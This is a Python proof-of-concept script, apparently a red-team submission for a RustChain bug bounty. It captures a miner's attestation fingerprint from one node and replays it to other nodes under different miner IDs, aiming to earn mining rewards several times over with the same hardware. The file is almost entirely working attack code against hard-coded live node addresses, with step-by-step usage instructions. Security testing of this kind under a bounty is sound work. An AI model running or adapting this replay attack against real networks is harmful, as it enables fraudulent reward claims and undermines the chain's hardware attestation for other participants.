#!/usr/bin/env python3
"""
Attestation Replay Cross-Node Attack Proof-of-Concept
RustChain Bounty #2296 - 200 RTC

Red Team PoC: Attempt to replay a captured attestation fingerprint
from one node to another node to earn rewards on multiple nodes
with the same physical hardware.

Usage:
  1. Capture a valid fingerprint from Node 1
  2. Replay it to Node 2 / Node 3 using this script
  3. If accepted → vulnerability confirmed
  4. If rejected → documentation of defenses

Author: Your Name
Wallet: 227fa20c24e7ed1286f9bef6d0050e18e38b2fbbf645cfe846b6febc7a37a48e
"""

import requests
import json
import sys
from typing import Dict, Optional

# RustChain Node endpoints
NODES = {
    "node1": "http://50.28.86.131",
    "node2": "http://50.28.86.153",
    "node3": "http://76.8.228.245"
}

class AttestationReplayAttack:
    def __init__(self):
        self.captured_fingerprint: Optional[Dict] = None
        self.captured_miner_id: Optional[str] = None
    
    def capture_from_node(self, node_url: str, miner_id: str) -> bool:
        """Capture the latest fingerprint from a node by getting miner status."""
        try:
            url = f"{node_url}/sophia/status/{miner_id}"
            resp = requests.get(url, timeout=10)
            if resp.status_code != 200:
                print(f"[✗] Failed to capture from {node_url}: {resp.status_code}")
                return False
            
            data = resp.json()
            latest = data.get("latest", {})
            fingerprint = latest.get("fingerprint")
            
            if not fingerprint:
                print("[✗] No fingerprint found in response")
                return False
            
            self.captured_fingerprint = fingerprint
            self.captured_miner_id = miner_id
            print(f"[✓] Captured fingerprint from {node_url} for miner {miner_id}")
            print(f"[i] Fingerprint keys: {list(fingerprint.keys())}")
            return True
            
        except Exception as e:
            print(f"[✗] Exception capturing: {e}")
            return False
    
    def replay_to_node(self, target_node_url: str, target_miner_id: str) -> Optional[Dict]:
        """Replay captured fingerprint to target node."""
        if not self.captured_fingerprint:
            print("[✗] No captured fingerprint to replay")
            return None
        
        try:
            url = f"{target_node_url}/sophia/inspect"
            payload = {
                "miner_id": target_miner_id,
                "fingerprint": self.captured_fingerprint
            }
            
            print(f"[i] Replaying to {url} as miner {target_miner_id}...")
            resp = requests.post(url, json=payload, timeout=30)
            
            print(f"[i] Status code: {resp.status_code}")
            if resp.status_code == 200:
                result = resp.json()
                print(f"[i] Verdict: {result.get('verdict')}")
                print(f"[i] Confidence: {result.get('confidence')}")
                print(f"[i] Reasoning: {result.get('reasoning')}")
                print(f"[i] Inspection ID: {result.get('inspection_id')}")
                return result
            else:
                print(f"[i] Response: {resp.text[:500]}")
                return None
                
        except Exception as e:
            print(f"[✗] Exception replaying: {e}")
            return None
    
    def save_capture(self, filename: str = "captured_attestation.json"):
        """Save captured attestation to file."""
        if not self.captured_fingerprint:
            print("[✗] No capture to save")
            return False
        
        output = {
            "miner_id": self.captured_miner_id,
            "fingerprint": self.captured_fingerprint,
            "captured_at": requests.get(f"{NODES['node1']}/api/blockheight").json().get("blockheight", "unknown")
        }
        
        with open(filename, "w") as f:
            json.dump(output, f, indent=2)
        
        print(f"[✓] Saved capture to {filename}")
        return True
    
    def load_capture(self, filename: str = "captured_attestation.json") -> bool:
        """Load capture from file."""
        try:
            with open(filename, "r") as f:
                data = json.load(f)
            self.captured_fingerprint = data.get("fingerprint")
            self.captured_miner_id = data.get("miner_id")
            print(f"[✓] Loaded capture from {filename}")
            return True
        except Exception as e:
            print(f"[✗] Failed to load: {e}")
            return False


def main():
    print("=" * 60)
    print("RustChain Attestation Replay Attack PoC")
    print("Bounty #2296 - 200 RTC")
    print("Wallet: 227fa20c24e7ed1286f9bef6d0050e18e38b2fbbf645cfe846b6febc7a37a48e")
    print("=" * 60)
    
    attack = AttestationReplayAttack()
    
    # Example workflow:
    # 1. Capture from Node 1
    print("\n→ Step 1: Testing connectivity to all nodes")
    for name, url in NODES.items():
        try:
            resp = requests.get(f"{url}/", timeout=5)
            print(f"  {name} ({url}): HTTP {resp.status_code} - OK")
        except Exception as e:
            print(f"  {name} ({url}): FAILED - {e}")
    
    print("\n→ Complete usage instructions in README")
    print("\nTo run attack:")
    print("  1. python3 attestation-replay-poc.py capture node1 YOUR_MINER_ID")
    print("  2. python3 attestation-replay-poc.py replay node2 YOUR_MINER_ID_NODE2")
    print("\nIf replay gets APPROVED, you have a working exploit!")
    
    # Handle command line args
    if len(sys.argv) < 3:
        return
    
    action = sys.argv[1]
    node_name = sys.argv[2]
    
    if node_name not in NODES:
        print(f"[✗] Unknown node {node_name}, choices: {list(NODES.keys())}")
        return
    
    node_url = NODES[node_name]
    
    if action == "capture":
        if len(sys.argv) < 4:
            print("[✗] Usage: capture <node> <miner_id>")
            return
        miner_id = sys.argv[3]
        attack.capture_from_node(node_url, miner_id)
        attack.save_capture()
    elif action == "replay":
        if len(sys.argv) < 4:
            print("[✗] Usage: replay <node> <target_miner_id>")
            return
        attack.load_capture()
        target_miner_id = sys.argv[3]
        result = attack.replay_to_node(node_url, target_miner_id)
        if result and result.get("verdict") == "APPROVED":
            print("\n[🎉] SUCCESS: Attestation replay accepted by target node!")
            print("This confirms the vulnerability: same hardware can mine on multiple nodes")
        else:
            print("\n[✓] Replay rejected by target node")
            print("This means defenses are working - document why")
    else:
        print(f"[✗] Unknown action {action}, choices: capture, replay")


if __name__ == "__main__":
    main()
